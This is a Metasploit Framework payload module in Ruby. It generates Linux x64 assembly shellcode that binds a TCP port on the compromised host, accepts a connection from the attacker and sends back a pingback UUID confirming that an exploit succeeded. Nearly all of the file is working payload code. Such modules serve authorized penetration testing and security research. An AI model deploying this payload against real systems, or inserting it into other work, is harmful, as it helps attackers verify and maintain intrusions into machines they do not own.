##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/payload/pingback'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/pingback'


module MetasploitModule

  CachedSize = 109

  include Msf::Payload::Linux
  include Msf::Payload::Single
  include Msf::Payload::Pingback
  include Msf::Payload::Pingback::Options

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Linux x64 Pingback, Bind TCP Inline',
      'Description'   => 'Accept a connection from attacker and report UUID (Linux x64)',
      'Author'        => [ 'bwatters-r7' ],
      'License'       => MSF_LICENSE,
      'Platform'      => 'linux',
      'Arch'          => ARCH_X64,
      'Handler'       => Msf::Handler::BindTcp,
      'Session'       => Msf::Sessions::Pingback
    ))
    def generate_stage
      # 22 -> "0x00,0x16"
      # 4444 -> "0x11,0x5c"
      encoded_port = [datastore['LPORT'].to_i,2].pack("vn").unpack("N").first
      encoded_host = Rex::Socket.addr_aton("0.0.0.0").unpack("V").first
      encoded_host_port = "0x%.8x%.8x" % [encoded_host, encoded_port]
      self.pingback_uuid ||= self.generate_pingback_uuid
      uuid_as_db = "0x" + pingback_uuid.chars.each_slice(2).map(&:join).join(",0x")

      asm = %Q^
          push   rsi
          push   rax
         ;SOCKET
          push   0x29
          pop    rax
          cdq
          push   0x2
          pop    rdi
          push   0x1
          pop    rsi
          syscall ; socket(PF_INET, SOCK_STREAM, IPPROTO_IP)
          test   rax, rax
          js failed

        xchg   rdi, rax
          mov    rcx, #{encoded_host_port}
          push   rcx
          mov    rsi, rsp
          push   rsp
          pop    rsi                          ; store pointer to struct

        bind_call:
          ; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
          ; rdi -> fd already stored in rdi
          ; rsi -> pointer to sockaddr_in6 struct already in rsi
          push   0x31
          pop    rax                          ; bind syscall
          push   0x10                         ; sockaddr length
          pop    rdx                          ;
          syscall

        listen_call:
          ; int listen(int sockfd, int backlog);
          ; rdi -> fd already stored in rdi
          push   0x32
          pop    rax                          ; listen syscall
          push   0x1
          pop    rsi                          ; backlog
          syscall

        accept_call:
          ; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
          ; rdi -> fd already stored in rdi
          push   0x2b
          pop    rax                          ; accept syscall
          cdq                                 ; zero-out rdx via sign-extension
          push   rdx
          push   rdx
          push rsp
          pop rsi                             ; when populated, client will be stored in rsi
          push   0x1c
          lea    rdx, [rsp]                   ; pointer to length of rsi (16)
          syscall
          xchg    rdi, rax                    ; grab client fd
        send_pingback:
          ; sys_write(fd:rdi, buf*:rsi, length:rdx)
          push #{uuid_as_db.split(",").length}  ; length of the PINGBACK UUID
          pop rdx                               ; length in rdx
          call get_uuid_address         ; put uuid buffer on the stack
          db #{uuid_as_db}  ; PINGBACK_UUID
        get_uuid_address:
          pop rsi                       ; UUID address into rsi
          xor rax, rax                  ; sys_write = offset 1
          inc rax                       ; sys_write = offset 1
          syscall                       ; call sys_write

        failed:
          push   0x3c
          pop    rax
          push   0x1
          pop    rdi
          syscall ; exit(1)
        ^
      Metasm::Shellcode.assemble(Metasm::X64.new, asm).encode_string
    end
  end
end
